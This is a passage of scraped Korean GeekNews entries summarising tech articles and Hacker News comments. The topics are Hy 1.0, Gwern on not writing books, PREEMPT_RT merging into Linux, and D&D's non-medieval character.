     * 제목이 이상함; AMD는 이미 PS4와 PS5의 공급업체였으며 PS6도 계속 공급할 예정임
          + Intel은 입찰 과정에서 패배했지만, 처음부터 'Playstation 사업'을 가지고 있지 않았음
     * Sony나 MS가 x86을 벗어나 하위 호환성을 깨뜨릴 가능성은 낮음
          + MS는 새로운 Windows ARM에서 좋은 x86-on-arm 에뮬레이션을 가지고 있음
     * Intel은 정부 및 클라우드 계약으로 인해 다른 것들은 중요하지 않음
     * Sony가 DRM/플랫폼 보안 전략을 Intel 환경에 맞추는 데 많은 마찰이 발생할 수 있음
          + 이는 Intel이 ""Partner Security Engine""을 분리한 동기 중 하나일 수 있음
"
"https://news.hada.io/topic?id=16888","Hy 1.0 – Python을 위한 Lisp Dialect","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    Hy 1.0 – Python을 위한 Lisp Dialect

     * 12년간의 개발과 실사용을 거쳐 Hy 1.0.0이 출시됨
     * Hy는 Python에 내장된 Lisp 방언임
          + Lisp 계열의 다중 패러다임 범용 프로그래밍 언어
          + Python의 대안 구문으로 구현됨
          + Python에 비해 다양한 새로운 기능, 일반화 및 구문 단순화를 제공함
          + 다른 Lisp에 비해 Python의 내장 기능과 서드파티 Python 라이브러리에 직접 액세스할 수 있음
          + 명령형, 함수형 및 객체 지향 프로그래밍 스타일을 자유롭게 혼합할 수 있음

GN⁺의 의견

     * Hy는 Python과 Lisp의 장점을 결합한 흥미로운 프로그래밍 언어임. Python의 풍부한 생태계와 라이브러리를 활용하면서도 Lisp의 강력한 기능과 유연성을 제공하여 개발자의 생산성을 높일 수 있음.
     * 그러나 Hy는 아직 널리 사용되지 않는 언어이므로, 학습 자료와 커뮤니티 지원이 부족할 수 있음. 또한 기존 Python 코드와의 호환성 문제가 발생할 수 있으므로 주의가 필요함.
     * Hy와 유사한 개념을 가진 다른 언어로는 Clojure와 Racket 등이 있음. 이들은 Lisp 계열의 언어로서 함수형 프로그래밍과 매크로 등의 기능을 제공하며, JVM이나 자체 런타임 위에서 동작함.

        Hacker News 의견

     * Hy가 Python으로 어떻게 번역되는지 이해하는 데 어려움을 겪었음
          + Hy는 Lisp 프로그래밍 언어의 방언으로, s-표현식을 Python의 추상 구문 트리(AST)로 번역함
          + Github 코드에서 이 컴파일러가 Python으로 작성되었음을 확인함
          + Hy를 ""Python에 내장된 Lisp 방언""으로 소개하는 대신 ""Python의 AST로 컴파일되는 Lisp 방언""으로 소개하는 것이 더 명확할 것 같음
          + Lisp를 Python에 내장하는 다양한 방법이 있으며, 각 방법은 매우 다르고 다양한 트레이드오프가 있음
          + 예를 들어, C로 인터프리터를 작성하거나 Python 바이트코드로 컴파일하거나 Python 소스 코드로 직접 번역할 수 있음
          + 어쨌든 흥미로운 프로젝트임
     * HYPE POST를 매우 좋아했음
          + 회사 소프트웨어와 함께 작업하는데 매우 훌륭함
     * Hy가 초기부터 지금까지 많이 발전했음을 보고 놀라움
          + Pycon에서 Hy를 처음 소개하는 번개 토크를 봤음
          + Paul을 만나고 Hy 초기 버전에 기여하기 시작했음
          + CL 스타일의 kwargs와 몇 가지 라이브러리 등을 담당했음
          + 프로젝트가 계속 진행되는 것을 보니 기쁨
     * 이제 <a href=""https://github.com/rcarmo/sushy"">https://github.com/rcarmo/sushy</a>를 정리할 수 있게 되었음
          + Hy를 업그레이드할 때마다 구문이 깨지거나 hyrule 패키지에서 이동하는 문제가 있었음
          + Hy는 iPad의 <a href=""https://holzschu.github.io/a-Shell_iOS"">https://holzschu.github.io/a-Shell_iOS</a>; 내에서 잘 작동함
          + vim/neovim의 구문 강조가 0.29+ 릴리스와 비동기 기능을 따라잡아야 함
          + Fennel과 Guile을 사용해봤지만, Python 라이브러리와 생태계에 접근할 수 있는 것이 더 좋음
          + 비동기 기능으로 효율적인 API 처리가 가능함
     * 축하함! 두 가지 질문이 있음
          + REPL 기반 개발을 지원하는지 (조건 시스템, breakloop 등)
          + 독립 실행형 배포판이 있는지. Python 자체를 배포하는 것은 번거로움. 이상적인 상황은 모든 종속성을 포함하는 단일 Hy 바이너리를 배포하는 것임
     * Clojure 팬들을 위한 관련 정보:
          + Python 3.8+을 대상으로 하는 Clojure 호환 Lisp 방언
          + <a href=""https://github.com/basilisp-lang/basilisp"">https://github.com/basilisp-lang/basilisp</a>;
     * 축하하고 감사함! Hy로 트랜스포머를 시도하고 <a href=""https://github.com/kunalb/orphism"">https://github.com/kunalb/orphism</a>을 릴리스했음
          + 다시 Hy를 사용해볼 때가 되었음
     * 덜 진지한 부분을 매우 즐겼음
          + 더 많은 프로그래밍 관련 프로젝트가 유머를 받아들였으면 좋겠음
          + 이는 Python 전통을 기리는 최고의 방법일 수 있음
     * Python 구문을 버리지 않고 함수형 프로그래밍 구성을 얻을 수 있음 (Hy가 하는 것처럼)
          + <a href=""https://github.com/thyeem/foc"">https://github.com/thyeem/foc</a>;
     * Raku의 좋은 점 중 하나는 기본적으로 놀라운 Lisp 인상을 준다는 것임
          + <a href=""https://www.codesections.com/blog/raku-lisp-impression/"">https://www.codesections.com/blog/raku-lisp-impression/</a>;
          + [Larry Wall의 수집 취향 덕분임]
"
"https://news.hada.io/topic?id=16811","책을 쓰지 말아야 하는 이유","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            책을 쓰지 말아야 하는 이유

     * 사람들은 종종 Gwern.net을 책으로 만들 생각이 있는지 묻지만, 그럴 의도가 전혀 없음
          + (Gwern은 개인 블로그 중 최고 사이트중 하나임)
     * 많은 작가에게 책을 쓰는 것은 해로울 수 있음. 기회비용과 위험 때문에 책 쓰는 것은 가장 마지막으로 해야 할 일이라고 생각함

책을 쓰지 않는 이유들

     * 책을 썼다는 사실에 대한 사랑은 있지만, 실제로 특정 책을 쓰는데 대한 사랑은 없음
     * 책을 완성하기 위해서는 수많은 시간을 할애해야 하며, 그 과정에서 새로운 글을 쓰거나 탐색하는 것이 어려워짐

책쓰기의 비용

     * 출판사나 에이전트가 책을 내자고 제안하기는 쉽지만, 어떤 책을 낼 것인지에 대한 고민이 필요함
     * Gwern.net을 그대로 책으로 만들기는 어려움. 하이퍼텍스트 기능을 제외하더라도 내용이 다양한 분야에 걸쳐 있어 선집 형태가 될 수밖에 없음
     * 부끄럽지 않은 책을 만들기 위해서는 수많은 시간을 들여 개정하고 다시 쓰고 하이퍼텍스트 기능을 제거하고 EPUB 등의 출판 양식에 맞춰야 함
     * LessWrong anthologies의 경우에도 이미 쓰인 포스트들을 책으로 만드는 데 수백 시간이 들었다고 함
     * 책을 쓰는 동안에는 다른 글을 쓰고 싶어도 책 쓰기에 방해가 될까봐 죄책감을 느낄 것이고, 새로운 아이디어를 탐색할 시간과 에너지가 없을 것임
     * 책이 출판된 후에도 홍보와 서평 대응 등 해야 할 일이 많음
     * 책에 담긴 생각은 되돌릴 수 없고 변경하기 어려워짐. Francis Fukuyama가 ""End of History"" 에세이와 책으로 유명해졌지만 오해와 모욕을 받은 것처럼, 책은 작가를 특정 이미지로 고정시킬 수 있음
     * 책 쓰기는 새로운 글쓰기나 탐색을 방해하고 작가를 한 곳에 머물게 하며, 우울증을 유발할 수 있음

사례 연구

     * Wait But Why?
          + Wait But Why(WBW)의 Tim Urban은 2010년대 중반 장문의 열정적인 에세이로 유명해짐
          + 2016년 미국 대선과 정치 추세에 환멸을 느껴 정치에 관한 책을 쓰기 시작함
          + 책의 범위가 계속 확장되고 거의 다 썼다고 생각하면서도 계속 고쳐 쓰는 등 착오 비용의 오류에 빠짐
          + 임신한 아내 때문에 책을 끝내야 했고, 결국 6년 만에 책을 출간함
          + 하지만 책에 대한 언급은 거의 없고, 책에 관한 글을 쓴 것보다 실제로 책을 읽은 사람이 더 적을 것으로 보임
          + WBW가 책을 쓰기 전의 속도를 유지했다면 2017년부터 2024년까지 55개의 글을 더 썼을 것임
     * 익명의 사례
          + WBW와 비슷한 시기에 또 다른 인기 블로거가 책을 쓰기 위해 침묵함
          + 2-3년 후 그와 저녁 식사를 했을 때, 책에 대해 물어볼까봐 긴장하는 모습이 역력했음
          + 4년 후 책이 출간되어 좋은 평가를 받았지만, 그 후로 이전의 활동으로 돌아오지 않음
          + 그에게 책을 쓰는 기회비용은 책을 쓰지 않았다면 썼을 모든 것이었음
          + 책을 쓰는 트라우마로 인해 탈진한 상태이고, 탈진은 전혀 다른 일을 해야 고칠 수 있음
     * 이 외에도 The Last Psychiatrist가 2014년 블로깅을 중단하고, 2020년에 책을 내고 나서 다시 글을 쓰지 않고 있다는 점 등

책을 속에 간직하기

     * 물론 블로그나 뉴스레터에 별 영향 없이 책을 쓰는 작가들도 있음
     * 그들은 매일 아침 한 시간씩 앉아서 할당량을 채우고 다음 일로 넘어감
     * 책이 그들의 마음을 짓누르지 않고, 보통 12개월 안에 출간할 것이라고 확신함
     * 대부분의 예비 작가들은 자신이 이런 유형인지 앞서 논의한 유형인지 이미 알고 있을 것임
     * 만약 자신이 앞서 논의한 유형이라면 책을 쓰겠다는 계획을 진지하게 의심해 봐야 함
          + 왜 책을 끝낼 수 있을 것이라고 생각하는가?
          + 책을 쓸 만한 가치가 있을 것인가?
          + 글을 책으로 써야 할 명확한 전문적 이유가 있는가? (J.K. 롤링이 아니라면 보통 ""판매""는 적절한 이유가 되지 못함)
     * 더 중요한 것은 책 쓰기가 자신에게 어떤 영향을 미칠 것인가임
          + 향후 5년간 모든 에너지를 책에 쏟는다면 어떤 것들을 포기해야 하는가?
          + 지난 5년간 썼던 모든 글을 기꺼이 불태우고 책 원고와 바꾸겠는가?
          + 책이 잘 되기를 바라면서 앞으로 쓸 모든 것을 걸 수 있겠는가? 아니면 책이 발목을 잡고 탈진시킬 위험이 있는가?
     * 만약 2019년에 GPT-2 실험 후 ""AI에 관한 책""을 쓰기로 결심했다면 <The Scaling Hypothesis>와 같은 글을 희생했을 것이고, 지금보다 나은 상황이 되지 않았을 것임
     * 많은 작가들이 책 쓰기를 진지한 프로젝트로 받아들인다면, 책 쓰기에는 때로 역효과를 낼 수 있는 심각한 위험이 있다는 것을 깨달을 것임
     * 누구나 속에 책 한 권쯤은 가지고 있지만, 어떤 이들은 그 책을 속에 간직해야 함
     * 우리는 책 쓰기를 받들어 모시기보다는, 그것이 종종 나쁜 생각이라는 것을 인정하고 좋은 작가들이 책을 쓰도록 죄책감을 느끼게 해서는 안 됨
     * 앞으로 내게서 책이 나오려 한다면 오히려 멀리하고 궤도에서 폭파시킬 것임. (그것이 확실한 방법임)

GN⁺의 의견

     * 책을 쓰는 것은 작가에게 상당한 부담이 될 수 있음. 블로그나 에세이 등 다른 형식의 글쓰기가 더 적합할 수 있음
     * 책을 쓰기로 결심하기 전에 자신이 어떤 유형의 작가인지 잘 파악해야 함. 책 쓰기가 자신에게 어떤 영향을 줄지 신중히 고려해야 함
     * 온라인 글쓰기와 달리 책은 출판되고 나면 내용을 쉽게 수정하기 어려움. 변화하는 주제를 다루기에는 적합하지 않을 수 있음
     * 책을 쓰는 것 자체가 목표가 되어서는 안 됨. 전하고 싶은 메시지와 아이디어가 있을 때 책 출판을 고려해 볼 수 있음
     * 요즘같이 급변하는 시대에 긴 호흡으로 책을 집필하는 것은 위험할 수 있음. 글쓰기의 주기를 짧게 가져가는 것이 변화에 대응하기 좋음

        Hacker News 의견

     * 블로그 게시물의 은유가 작가의 주장을 모순되게 만듦
          + 작가가 소설을 'facehugger'에 비유했지만, 실제로는 'chestburster'임
          + 은유에 따르면 작가는 알이고 독자는 공격받는 우주선 승무원임
          + 은유는 재미있지만, 작가의 주장을 약화시킴
     * 반쯤 성공한 작가와의 대화
          + 기계공학 교수였던 작가가 범죄 소설을 쓰기 시작함
          + 범죄 소설이 덜 붐비는 시장이어서 선택함
          + 지역 관광지를 배경으로 소설을 씀
          + 여러 책을 동시에 작업하여 균형을 맞춤
          + 성공적인 작가가 되는 것은 낭만적이지 않음
     * 책을 쓰고 싶지 않다면 쓰지 말라는 조언
          + 책을 쓰고 싶은 강한 열망이 없다면 쓰지 말라는 의견
          + 출판사와 에이전트는 나중 문제임
          + 책 쓰는 것이 혼란스럽다면 쓰지 말라는 조언
     * 튜토리얼을 전자책으로 전환하여 생계를 유지한 경험
          + 전자책 판매로 6년 동안 생계를 유지함
          + 개발도상국에 살면서 국제 시장에 판매함
     * 챗봇 구축 경험을 블로그에 공유한 이야기
          + 챗봇 구축 경험을 블로그에 공유함
          + 더 많은 내용을 공유하고 싶어 책으로 전환함
     * 책 쓰기를 진지하게 프로젝트로 여겨야 한다는 의견
          + 책 쓰기를 문화적 이상으로 여기는 것이 위험할 수 있음
          + 언어 학습 경험을 통해 기회 비용이 크다는 것을 깨달음
     * 책을 쓰지 말아야 하는 주된 이유
          + 주제가 책 길이로 다룰 필요가 없을 때
          + 많은 책이 너무 장황하고 개인 경험이 과도함
     * Rilke의 조언: 책을 써야 하는지 스스로에게 물어보라는 조언
          + 깊이 고민하고 '반드시 써야 한다'는 강한 열망이 있다면 쓰라는 조언
     * 가족의 회고록을 출판한 경험
          + 가족의 회고록을 발견하고 전자책으로 출판함
     * 도전과 학습을 위해 기술서를 쓰고 싶다는 의견
          + 돈이나 기회보다는 도전과 학습을 위해 기술서를 쓰고 싶음
"
"https://news.hada.io/topic?id=16860","Realtime Linux가 오랜 논쟁 끝에 리눅스 커널에 공식 포함","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 Realtime Linux가 오랜 논쟁 끝에 리눅스 커널에 공식 포함

     * Realtime Linux가 커널의 일부로 공식 포함되어, 이제 실시간 운영체제(RTOS) 없이 ""실시간 리눅스"" 사용 가능해 질 것
     * 오디오 장비, 산업용 용접 레이저, 화성 탐사선 등에 ""실시간 Linux""를 사용하고 싶다면 오래전부터 그 옵션이 있었음 (QNX 등의 대안을 사용하지 않는다는 가정 하에)
     * 대학들이 1990년대 후반부터 자체 실시간 커널을 만들기 시작함
     * PREEMPT_RT라는 패치 세트가 적어도 2005년부터 존재해 왔음
     * NO_HZ와 같은 실시간 작업의 일부 측면은 오래전에 메인라인 커널로 이동되어 데이터 센터, 클라우드 컴퓨팅 또는 많은 CPU가 있는 모든 것에서 사용할 수 있게 되었음

PREEMPT_RT의 메인라인 병합

     * 6.12 커널에서 PREEMPT_RT가 메인라인에 병합될 가능성이 높음
     * Linus Torvalds가 Open Source Summit Europe에 참석하는 동안 최종 승인이 이루어짐
     * Torvalds는 프로세스가 충돌하는 정확한 순간을 찾아낼 수 있지만 실시간 컴퓨팅에 반하는 지연 시간을 도입하는 디버깅 도구인 printk에 대한 원래 코드를 작성함
     * Phoronix 블로그는 실시간 메인라이닝에 중요한 스레드/원자 콘솔 지원을 위한 printk 변경 사항과 함께 PREEMPT_RT의 커널로의 진행 상황을 추적해 왔음

데스크톱 Linux에 미치는 영향? 별로 없음

     * 고급 오디오 제작이나 복제를 넘어서는 (그것조차도 논란의 여지가 있음) 실시간 커널은 윈도우를 더 빠르게 만들거나 프로그램을 더 빠르게 만들지는 않을 것임
     * 그러나 실시간 Linux가 제공하는 보장된 실행과 최악의 경우 지연 시간은 자동차 브레이크를 모니터링하고, CNC 기계를 안내하며, 복잡한 다중 CPU 시스템을 규제하는 시스템에 매우 유용함
     * PREEMPT-RT를 메인라인 커널에 포함시키면 실시간 시스템을 유지 관리하는 것이 더 쉬워지며, 트리 외부 패치를 관리할 필요가 없어짐

전문 실시간 OS 솔루션 제공업체에 미치는 영향

     * Ubuntu는 2023년에 실시간 버전의 배포판을 제공하기 시작했지만 Ubuntu Pro 구독이 필요했음
     * Ubuntu는 로보틱스, 자동화, 임베디드 Linux 및 기타 실시간 요구 사항에 대한 수정, 패치, 모듈 통합 및 테스트를 제공하면서 실시간 릴리스를 제공했음
     * 이제까지 미션 크리티컬 시스템을 위한 전문 실시간 OS 솔루션 제공업체에게는 상황이 달라질 것임

Linus Torvalds의 견해

     * 2006년 Kernel Summit에서 Torvalds는 ""Linux로 레이저를 제어하는 것은 미친 짓이지만, 이 방에 있는 모든 사람은 자신만의 방식으로 미쳤다""고 말했음
     * ""Linux를 사용하여 산업용 용접 레이저를 제어하고 싶다면 PREEMPT_RT를 사용하는 것에 문제가 없다""고 말했음
     * 약 18년 후, Torvalds와 커널 팀, 그리고 실시간의 장기 유지 관리자이자 챔피언인 Steven Rostedt는 그러한 종류의 일을 더 쉽게 만들었음

GN⁺의 의견

     * 실시간 Linux의 메인라인 병합은 Linux의 적용 범위를 더욱 넓히고 다양한 분야에서 활용될 수 있게 해줄 것으로 기대됨
     * 특히 실시간성이 중요한 산업 현장이나 임베디드 시스템, 로봇 공학 등에서 Linux가 더욱 널리 사용될 것으로 보임
     * 다만 실시간 Linux를 도입할 때는 하드웨어 호환성, 시스템 안정성, 개발 난이도 등을 고려해야 할 것임
     * 기존의 실시간 OS인 QNX, VxWorks, INTEGRITY 등도 여전히 해당 분야에서 경쟁력을 갖고 있어, 상황에 맞는 선택이 필요할 것으로 보임
     * 앞으로 실시간 Linux가 메인라인에 포함됨에 따라 개발 생태계가 더욱 활성화되고, 다양한 하드웨어와 소프트웨어의 지원 범위가 넓어질 것으로 기대됨

   실시간 운영체제가 뭔지, PREEMPT_RT가 뭐고 실시간 운영체제와 어떤 관련성이 있는지 간략하게라도 설명이 들어갔으면 좋았을 것 같은데 디테일이 거의 나와있지 않아서 아쉽네요 ㅠ

   Linux와 Real-Time Operating System(RTOS) 간의 주요 차이점은 실시간성과 결정론적 동작에 있습니다. 이 차이는 시스템이 응답해야 하는 시간 제약과 정확성에 큰 영향을 미치며, 각각의 OS가 어떤 상황에서 적합한지에 대한 이해를 돕습니다.
    1. Linux와 RTOS의 개요
       Linux: 일반적으로 수정된 Linux 커널을 기반으로 하는 운영 체제로, 다양한 임베디드 하드웨어에서 사용됩니다. 사용자 친화적이며, 네트워크, 파일 시스템, 드라이버 등 다양한 기능을 제공하여 복잡한 어플리케이션에 적합합니다.

   RTOS (Real-Time Operating System): 일정 시간 안에 작업을 처리해야 하는 응답성을 보장하는 운영 체제입니다. RTOS는 주로 산업 자동화, 의료 장비, 자동차 제어 시스템 등과 같은 실시간 응답이 중요한 분야에서 사용됩니다.
    2. 실시간성 및 결정론적 동작의 차이
       Linux의 특성
       비결정론적 응답 시간: Linux 커널은 주로 스루풋과 효율성에 초점을 맞추어 설계되었기 때문에, 작업이 언제 실행될지 정확하게 예측할 수 없습니다. 이는 스케줄러가 다양한 우선순위의 작업을 관리하며, I/O 작업, 메모리 관리 등의 복잡한 프로세스가 영향을 미치기 때문입니다.

   Preemption (선점) 제한: 일반적인 Linux 커널은 일부 실시간 기능을 제공하지만, 모든 커널 작업이 즉시 중단될 수 있는 것은 아닙니다. 특히, 커널이 긴 시간 동안 인터럽트에 반응하지 않거나, 중요한 작업을 수행하느라 다른 태스크가 지연될 수 있습니다.

   Latency (지연 시간) 변동성: 다양한 시스템 작업과 멀티태스킹 환경에서 지연 시간이 불규칙하게 변동할 수 있습니다. 이는 네트워크 스택 처리, 디스크 I/O 등 여러 요소에 의해 영향을 받을 수 있습니다.

   실시간 패치 (PREEMPT-RT): 실시간 응답을 개선하기 위해 PREEMPT-RT 패치를 적용하여 커널의 실시간성을 높일 수 있습니다. 하지만 여전히 RTOS처럼 완벽하게 예측 가능한 응답을 보장하지는 않습니다.

   RTOS의 특성
   결정론적 응답 시간: RTOS는 설계상 특정 시간 내에 작업을 완료할 수 있도록 보장합니다. 주어진 시간 내에 반드시 작업을 수행하기 때문에 응답이 매우 일관되고 예측 가능합니다.

   고속 인터럽트 처리: RTOS는 인터럽트 처리를 빠르고 우선적으로 수행하며, 대부분의 경우 중요한 태스크를 빠르게 처리할 수 있도록 인터럽트를 우선시합니다. 이는 하드 실시간 제약 조건을 충족시킵니다.

   작고 경량화된 커널: RTOS는 필요한 최소 기능만 포함하여 매우 가볍고, 작업 스케줄링이 매우 효율적입니다. 따라서 시스템 부하가 적고, 정확하게 설계된 타이밍에 따라 작업을 실행할 수 있습니다.

   우선순위 기반 스케줄링: 태스크 우선순위가 명확하게 설정되며, 높은 우선순위의 작업이 즉시 처리될 수 있습니다. 이는 미션 크리티컬한 환경에서의 사용을 보장합니다.

   Low Latency: RTOS는 매우 낮은 지연 시간으로 실시간 작업을 처리합니다. 하드웨어 수준에서의 빠른 응답이 필요할 때 적합합니다.
    3. 실시간성 측면에서의 주요 차이점 요약
       특성 || Linux RTOS
       ============================================================
       응답 시간 || 비결정론적, 변동성이 있음 결정론적, 일정한 응답 시간 보장
       우선순위 처리 || 우선순위가 있지만, 실시간 보장 없음 우선순위가 명확하며,
       || 높은 우선순위 작업 우선 처리
       커널 크기 || 크고 기능이 많음 작고 경량화
       지연 시간 || 네트워크, 디스크 I/O 등에 의해 매우 낮음, 거의 일정
       지연 가능
       시스템 복잡성 || 복잡한 어플리케이션 실행에 적합 간단한 실시간 작업 수행에 적합
       적용 분야 || 멀티미디어, 네트워크 등 산업 제어, 로봇 공학, 의료기기 등
       || 복잡한 사용자 인터페이스
       결론
       Embedded Linux는 네트워크 처리, 멀티미디어 애플리케이션, 복잡한 사용자 인터페이스를 필요로 하는 임베디드 시스템에 적합합니다. 실시간 패치를 적용하면 실시간 성능이 어느 정도 개선되지만, RTOS만큼 결정론적이지는 않습니다.

   RTOS는 시간이 중요한 미션 크리티컬한 응용 프로그램에 필수적입니다. 일정한 응답 시간이 필요한 경우, 특히 하드웨어 제어, 산업용 로봇, 항공우주 및 의료 기기 등 실시간 제약이 있는 환경에서 RTOS를 사용합니다.

   항상 QNX와 VxWorks 때문에 골머리를 앓았는데, 이제는 누구나 좀 더 수월하게 접근 할 수 있겠네요.

        Hacker News 의견

     * 몇 년간의 노력 끝에 큰 성과를 이룬 것임
          + 대부분의 작업은 Thomas Gleixner와 그의 팀이 수행했음
          + Linutronix를 설립했으며 현재 Intel이 소유하고 있음
          + 마지막 printk 비트에 대한 풀 리퀘스트 링크 제공
          + 커널 구성에서 PREEMPT_RT에 대한 풀 리퀘스트 링크 제공
          + 커널 v6.11 위에 RT 패치 로그 링크 제공
          + 새로운 printk 인프라가 실제 드라이버에 채택될 필요가 있음
          + RT 패치셋의 크기가 이전보다 훨씬 작아졌음
          + Linus가 신뢰를 보여주는 큰 신호임
          + 팀에게 축하를 보냄
     * 실시간 커널의 효과를 보려면 cyclictest 유틸리티를 빌드하고 실행할 것을 권장함
          + 각 CPU 코어의 인터럽트 지연 시간을 측정하고 표시함
          + 실시간 패치 없이 최악의 경우 지연 시간이 두 자릿수 밀리초에 이를 수 있음
          + 실시간 패치가 적용되면 최악의 경우 지연 시간이 한 자릿수 마이크로초로 감소함
          + 일관된 낮은 지연 시간을 얻으려면 전원 절약 상태를 꺼야 함
          + cyclictest는 Linux에서 실시간 작업을 할 때 중요한 도구임
          + 소프트웨어 정의 라디오(SDR) 처리 시 시스템의 성능 차이를 설명함
          + 실시간 커널이 적용되면 GNOME과 libreoffice를 실행하면서도 SDR이 문제 없이 작동함
     * RT 패치셋 없이 3ms 지연 시간으로 한두 개의 악기를 실행할 수 있음
          + RT 패치셋을 사용하면 1ms 지연 시간으로 6개의 악기를 실행할 수 있음
          + 수십 개의 Chrome 창을 열고 3D 슈터 게임을 하면서도 문제가 없음
          + 일반 저지연 스케줄러보다 큰 차이를 보임
     * 2000년대 중반에 Linux를 실시간 작업에 사용하려 했던 경험을 공유함
          + 당시 실시간 Linux는 매우 해킹적이고 트리 외부에 있었음
          + 실시간 동작을 달성하기 위해 Linux를 진정한 실시간 마이크로커널 내에서 프로세스로 호스팅하는 것이 일반적인 해결책이었음
          + 실시간 Linux가 비실용적이었던 이유는 모든 비선점 가능한 섹션의 실행 시간을 보장해야 했기 때문임
          + 이 요구 사항을 어떻게 해결했는지 궁금해함
          + Linux가 우선순위 역전을 지원하는지 여부를 질문함
     * 실시간 프로그래밍이 어떻게 이루어지는지에 대한 좋은 자료가 있는지 질문함
          + 프로그램이 실제로 실시간인지 확인하는 방법에 대해 궁금해함
          + 실시간 코딩이 일반 코딩과 다른지 질문함
          + 현대 CPU 아키텍처가 실시간 프로그래밍에 미치는 영향에 대해 궁금해함
     * Torvalds가 printk의 원래 코드를 작성했다는 언급에 대해 의문을 제기함
          + printk 디버깅 도구에 대한 설명에 동의하지 않음
     * CNC 커뮤니티에 큰 도움이 될 것임
          + RT는 필수적이며 빌드를 훨씬 쉽게 만듦
     * 매우 멋지다고 생각함
          + 어떻게 ""켜는지""에 대해 궁금해함
          + 컴파일 타임/부트 타임 옵션인지, 아니면 시스템에서 실행 중인 프로세스가 타임슬라이스/지연 시간 보장을 요청하는 것인지 질문함
     * 데스크탑 사용자에게 실시간 커널을 사용하는 것의 단점에 대해 궁금해함
"
"https://news.hada.io/topic?id=16808","D&D 반중세적 특성반중세적 특성

D&D는 중세적이지 않음

  중세적이지 않음

     * OD&D(Original Dungeons & Dragons)는 중세 유럽 판타지 게임으로 여겨질 수 있음
     * 그러나 실제 게임에서는 봉건제, 유럽, 기사도, 제국의 암흑기, 군주제 등의 요소가 거의 없음
     * OD&D의 문화적 세부 사항은 Gygax의 독창적인 사회를 암시하며, 중세 판타지로는 비논리적이지만 미국의 판타지로는 일관되고 인상적임

  봉건적이지 않음

     * 봉건 사회에서는 전투에서 영광을 얻어 영주로부터 땅을 받음
     * D&D에서는 땅이 무료로 제공되며, 주로 동전과 보석 형태로 부를 축적함
     * 성을 짓기 위해서는 주변의 몬스터를 제거해야 하며, 다른 통치자와 경쟁하거나 세금을 낼 필요가 없음

  기사 없음

     * OD&D에는 기사라는 단어가 등장하지 않음
     * 성을 소유한 전사, 마법사, 성직자가 있으며, 이들은 기사처럼 행동하지만 기사라고 불리지 않음
     * 성을 소유한 전사는 모험가 파티의 비율과 비슷하게 드물게 나타남

  봉신 없음

     * 봉건 사회에서는 사람들이 보호를 대가로 봉신이 됨
     * D&D에서는 봉신 대신 월급을 받고 충성을 사는 고용 모델을 사용함

  왕 없음

     * 군주제의 증거가 없음
     * 플레이어는 누구에게도 충성을 맹세할 필요가 없음
     * 고블린 왕과 같은 몬스터의 왕은 단순히 지역 보스일 뿐임

  잃어버린 제국 없음

     * OD&D 세계에는 권력 공백이 있으며, 플레이어가 이를 이용할 수 있음
     * 던전의 보물은 현재의 경제와 일치하며, 과거의 부유한 시대를 암시하지 않음

  유럽적 세부 사항이 거의 없음

     * 몬스터 설명에서 유럽 문화의 흔적이 거의 없음
     * D&D 무기 목록은 중세적 느낌을 주지만, 대부분의 무기와 갑옷은 고대 유럽과 아시아에서도 나타남

  중세적이지 않다면 무엇인가?

     * D&D 규칙은 봉건 모델을 명시적으로 배제하고, 현금 기반 경제와 무정부 상태의 사회를 제안함
     * OD&D는 자본주의나 상업주의를 암시하는 돈 모으기에 집착함
     * Gygax는 미국의 경험을 바탕으로 게임을 만들었으며, 이는 미국 판타지의 중요한 이정표임

GN⁺의 정리

     * OD&D는 중세 유럽 판타지보다는 미국의 판타지를 반영함
     * 봉건제나 군주제 대신 현금 기반 경제와 무정부 상태의 사회를 제안함
     * Gygax는 미국의 경험을 바탕으로 게임을 만들었으며, 이는 미국 판타지의 중요한 이정표임
     * OD&D의 설정은 플레이어가 자유롭게 탐험하고 영웅이 될 수 있는 세계를 제공함
     * 비슷한 기능을 가진 다른 프로젝트로는 ""Greyhawk""와 ""Empire of the Petal Throne""이 있음

   봉신 없음에서 화들짝 ...

        Hacker News 의견

     * 첫 번째 의견: 글쓴이는 책의 저자가 게임의 권위자라고 가정하는 실수를 지적함. 실제로는 던전 마스터가 아이디어로 넘쳐나고, 책은 참고 자료일 뿐임
          + ""Gygax""의 게임 핵심은 책이 아니라 테이블에서 발생함
          + 중세적 요소는 게임 경험의 중심이 아님
     * 두 번째 의견: 봉건제는 단순히 군사적 영광을 위한 토지 교환이 아님. 실제로 ""overlord""는 우리가 생각하는 것보다 약함
          + 봉건제의 복잡성을 설명하는 ACOUP 포스트를 참조함
     * 세 번째 의견: D&D는 미국의 꿈을 반영함. ""Paranoia""와 ""Call of Cthulhu""는 D&D에 대한 반발로 만들어진 RPG임
          + ""Paranoia""는 전체주의 국가에서의 노동 집단을 다룸
          + ""Call of Cthulhu""는 우주적 절망과 개인적 파멸을 실험함
     * 네 번째 의견: ""Medieval""이라는 용어는 D&D의 기술 수준을 반영함. 사회적 또는 문화적 요소와는 관련이 없음
     * 다섯 번째 의견: 현대의 ""baristacore"" 판타지는 현대 미국 도시 생활을 반영함
          + Dragon Age, Warcraft, D&D가 이 방향으로 나아가고 있음
     * 여섯 번째 의견: Gary Gygax는 원래 D&D 책을 ""환상적인 중세 전쟁 게임 규칙""으로 설명함
          + 초기 D&D 책은 전투 시스템을 설명하지 않음
          + ""Chainmail""의 규칙을 추천함
     * 일곱 번째 의견: D&D의 민주주의적 성격이 엄격한 사회적 계층 구조에서의 역할 놀이를 어렵게 함
          + Star Trek RPG가 실패한 이유 중 하나는 플레이어들이 평등을 원했기 때문임
          + D&D 팬들은 현대적 사고방식을 버리고 중세적 사고방식을 채택하기 어려워함
     * 여덟 번째 의견: D&D를 중세가 아닌 먼 미래의 포스트-포스트-산업 사회로 해석해야 함
          + 마법은 이해하기 어렵고 불러내기 힘든 나노 기술로 해석됨
          + 다양한 종족은 시간이 지나면서 종분화된 결과임
          + 신들은 초인간적 또는 인공지능적 존재로 해석됨
     * 아홉 번째 의견: D&D는 펄프 소설을 아이디어 콜라이더에 넣은 결과임
          + Conan과 Tolkien이 큰 영향을 미침
          + 현실주의와 일관성을 기대하는 것은 판타지를 파괴함
     * 열 번째 의견: D&D 3판 기준으로, DM은 규칙 집행자 및 NPC 제작자로 변함
          + DM이 ""중세"" 설정을 강제하면 캠페인은 중세적이 될 수 있음
          + DM이 선택한 세계에 따라 게임 경험이 크게 달라짐

   이글을 보여주니

